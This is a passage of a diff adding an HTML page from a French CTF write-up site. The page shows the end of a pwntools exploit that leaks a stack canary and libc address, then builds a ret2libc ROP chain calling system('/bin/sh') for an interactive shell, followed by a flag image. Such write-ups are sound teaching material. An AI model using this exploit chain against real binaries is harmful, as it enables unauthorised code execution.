+</span></span><span style="display:flex;"><span>offset__libc_start_main_ret <span style="color:#f92672">=</span> <span style="color:#ae81ff">51</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>canary , libc_leak <span style="color:#f92672">=</span> Leak_addr([offset_canary,offset__libc_start_main_ret],proc)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>libc<span style="color:#f92672">.</span>address <span style="color:#f92672">=</span> int(libc_leak,<span style="color:#ae81ff">16</span>) <span style="color:#f92672">-</span> <span style="color:#ae81ff">0x2409b</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>print(<span style="color:#e6db74">&#39;Canary : &#39;</span><span style="color:#f92672">+</span>hex(int(canary,<span style="color:#ae81ff">16</span>)))
+</span></span><span style="display:flex;"><span>print(<span style="color:#e6db74">&#39;Libc   : &#39;</span><span style="color:#f92672">+</span>hex(libc<span style="color:#f92672">.</span>address))
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>rop <span style="color:#f92672">=</span> ROP(libc)
+</span></span><span style="display:flex;"><span>pop_rdi    <span style="color:#f92672">=</span> rop<span style="color:#f92672">.</span>find_gadget([<span style="color:#e6db74">&#39;pop rdi&#39;</span>, <span style="color:#e6db74">&#39;ret&#39;</span>])[<span style="color:#ae81ff">0</span>]
+</span></span><span style="display:flex;"><span>ret        <span style="color:#f92672">=</span> rop<span style="color:#f92672">.</span>find_gadget([<span style="color:#e6db74">&#39;ret&#39;</span>])[<span style="color:#ae81ff">0</span>]
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;&#39;</span>
+</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">+=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;A&#39;</span><span style="color:#f92672">*</span>(<span style="color:#ae81ff">8</span><span style="color:#f92672">*</span><span style="color:#ae81ff">39</span>)
+</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">+=</span> p64(int(canary,<span style="color:#ae81ff">16</span>))
+</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">+=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;B&#39;</span><span style="color:#f92672">*</span><span style="color:#ae81ff">8</span>
+</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">+=</span> p64(pop_rdi)
+</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">+=</span> p64(next(libc<span style="color:#f92672">.</span>search(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;/bin/sh</span><span style="color:#ae81ff">\x00</span><span style="color:#e6db74">&#39;</span>)))
+</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">+=</span> p64(ret)
+</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">+=</span> p64(libc<span style="color:#f92672">.</span>sym[<span style="color:#e6db74">&#39;system&#39;</span>])
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>proc<span style="color:#f92672">.</span>sendline(payload)
+</span></span><span style="display:flex;"><span>proc<span style="color:#f92672">.</span>interactive()
+</span></span></code></pre></div><p>Maintenant On a le Flag !</p>
+<p><img src="./img/flag.png" alt="Alt text"></p>
+
+  
+  <hr>
+<div class="footer">
+    
+	    
+            <a class="previous-post" href="//localhost:1313/writeups/factormaster-tjctf-2022/?ref=footer"><span style="font-weight:bold;">« Previous</span><br>Factor Master | tjctf 2022 | Catégorie Crypto |...</a>
+        
+	    
+            <div class="next-post">
+                <a href="//localhost:1313/writeups/mod_ctfauth-bsidessf-2022/?ref=footer"><span style="font-weight:bold;">Next »</span><br>Mod ctfauth | Bsidessf 2022 | Catégorie Reverse |...</a>
+            </div>
+        
+    
+</div>
+
+  
+</div>
+            </main>
+            
+  
+    <div class="article-toc ">
+    <div class="toc-wrapper">
+      <h4 id="contents"></h4>
+      <nav id="TableOfContents">
+  <ul>
+    <li><a href="#necessaires">Necessaires</a></li>
+    <li><a href="#flag">Flag</a></li>
+    <li><a href="#solution-détaillée">Solution détaillée</a>
+      <ul>
+        <li></li>
+      </ul>
+    </li>
+  </ul>
+</nav>
+    </div>
+</div>
+
+  
+
+        </div>
+    </body>
+</html>
